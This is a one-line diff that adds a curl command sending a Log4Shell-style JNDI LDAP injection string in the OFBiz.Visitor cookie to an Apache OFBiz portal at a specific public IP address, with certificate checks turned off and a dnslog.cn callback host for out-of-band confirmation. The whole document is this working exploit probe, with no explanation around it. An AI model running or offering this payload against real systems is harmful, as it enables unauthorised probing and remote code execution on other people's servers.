@@ -1,0 +1,1 @@
+./curl/linux/curl --insecure -H "Cookie: OFBiz.Visitor=\${jndi:ldap://0y1R7QHHx9h4dWS5.tol4fm.dnslog.cn}" https://54.244.78.120/myportal/control/main -o curl_tmp
